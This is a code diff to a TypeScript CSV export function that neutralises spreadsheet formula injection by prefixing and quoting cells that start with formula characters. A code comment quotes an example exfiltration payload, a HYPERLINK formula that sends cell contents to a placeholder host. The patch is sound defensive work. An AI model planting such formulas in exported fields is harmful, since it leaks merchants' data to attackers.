@@ -12,6 +12,14 @@ export type CsvCell = string | number | bigint | boolean | Date | null | undefin
 
 const NEEDS_QUOTING = /[",\r\n]/;
 
+/**
+ * Leading characters that make Excel / Google Sheets treat a cell as a
+ * formula. Every exported field (customer names, emails, metadata) is
+ * buyer-controlled, so `=HYPERLINK("http://x/?"&A1,"click")` in a name field
+ * would execute when the merchant opens the export.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
 export function formatCell(value: CsvCell): string {
   if (value === null || value === undefined) return "";
   let s: string;
@@ -19,6 +27,18 @@ export function formatCell(value: CsvCell): string {
   else if (typeof value === "bigint") s = value.toString();
   else if (typeof value === "boolean") s = value ? "true" : "false";
   else s = String(value);
+
+  // Numbers we produced ourselves are never formulas — but a negative number
+  // arriving as a string is indistinguishable from an attacker's payload, so
+  // only skip neutralization for real numeric types.
+  const isNumeric = typeof value === "number" || typeof value === "bigint";
+  if (!isNumeric && FORMULA_LEAD.test(s)) {
+    // A leading apostrophe forces text interpretation in Excel and Sheets.
+    // Always quote too, so the apostrophe survives and any embedded
+    // separator stays escaped.
+    return `"'${s.replace(/"/g, '""')}"`;
+  }
+
   if (NEEDS_QUOTING.test(s)) {
     return `"${s.replace(/"/g, '""')}"`;
   }
